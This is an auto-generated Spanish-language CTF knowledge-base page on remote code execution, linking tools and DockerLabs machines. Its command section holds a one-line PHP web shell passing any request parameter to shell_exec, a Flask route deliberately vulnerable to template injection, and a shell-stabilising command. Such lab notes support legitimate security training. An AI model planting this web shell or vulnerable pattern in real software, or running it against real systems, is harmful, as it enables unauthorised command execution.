---
title: Remote Code Execution
node_type: technique
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# Remote Code Execution

## Descripcion

Remote Code Execution es la capacidad de ejecutar codigo en el objetivo desde una entrada remota. En una cadena de ataque suele ser el punto de paso entre explotacion web y post-explotacion.

## Uso en laboratorio

Usarla solo en laboratorios propios, CTFs o entornos con autorizacion explicita. La evidencia debe separar enumeracion, explotacion y post-explotacion para que la ruta sea reproducible.

## Metodologia minima

- Identificar superficie y prerequisitos.
- Confirmar la tecnica con evidencia reproducible.
- Documentar payloads, errores y condiciones.
- Conectar la causa raiz con mitigaciones defensivas.

## Comandos

```bash
<?php
echo "TESTING";
?>
```

```bash
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def hello():
    nombre = request.args.get('nombre', 'Invitado')
    plantilla = f"<h1>Hola, {nombre}!</h1>"  # PARTE VULNERABLE A SSTI
    return render_template_string(plantilla)
```

```bash
script /dev/null -c bash
```

```bash
<?php
echo "<pre>" . shell_exec($_REQUEST["parametro__cualquiera"]) . "</pre>";
?>
```

## Herramientas relacionadas

- [base64](../tools/base64.md)
- [Burp Suite](../tools/burp-suite.md)
- [CiberChef](../tools/ciberchef.md)
- [FFUF / WFuzz](../tools/ffuf-wfuzz.md)
- [find](../tools/find.md)
- [Gobuster](../tools/gobuster.md)
- [grep](../tools/grep.md)
- [GTFOBins](../tools/gtfobins.md)
- [John the Ripper](../tools/john-the-ripper.md)
- [Netcat](../tools/netcat.md)
- [Nmap](../tools/nmap.md)
- [Ping](../tools/ping.md)
- [Python](../tools/python.md)
- [Ruby](../tools/ruby.md)
- [ssh](../tools/ssh.md)
- [strings](../tools/strings.md)
- [sudo](../tools/sudo.md)
- [WhatWeb](../tools/whatweb.md)

## Servicios relacionados

- [Apache](../services/apache.md)
- [HTTP](../services/http.md)
- [Joomla](../services/joomla.md)
- [PHP](../services/php.md)
- [SSH](../services/ssh.md)

## Maquinas que utilizan esta tecnica

- [Candy](../machines/dockerlabs/facil/candy.md)
- [Psycho](../machines/dockerlabs/facil/psycho.md)
- [Upload](../machines/dockerlabs/facil/upload.md)
- [Verdejo](../machines/dockerlabs/facil/verdejo.md)
- [Vulnvault](../machines/dockerlabs/facil/vulnvault.md)
- [Where Is My Web Shell](../machines/dockerlabs/facil/where-is-my-web-shell.md)
